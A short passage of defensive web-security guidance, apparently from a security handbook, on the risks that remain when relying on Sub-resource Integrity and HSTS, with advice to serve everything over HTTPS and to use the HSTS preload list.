#### Sub-resource Integrity (SRI) {#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources-sri}

Similar to the above with trusting the browser to support the SRI header. All requests should be made over HTTPS. The server should not respond to any requests for unencrypted data.

Take care in making sure all requests are to HTTPS URLs. You could also automate this as part of your linting procedure on a pre-commit hook or source control.

Make sure your web server only ever responds over HTTPS, including the very first response.

### TLS Downgrade {#network-risks-that-solution-causes-tls-downgrade}

#### HTTP Strict Transport Security (HSTS) {#network-risks-that-solution-causes-tls-downgrade-hsts}

Unless the browsers know about your domain and have it added to their HSTS Preload list, then the connection is still not safe.

Make sure your web server only ever responds over HTTPS, including the very first response.

Again your trusting the browser.
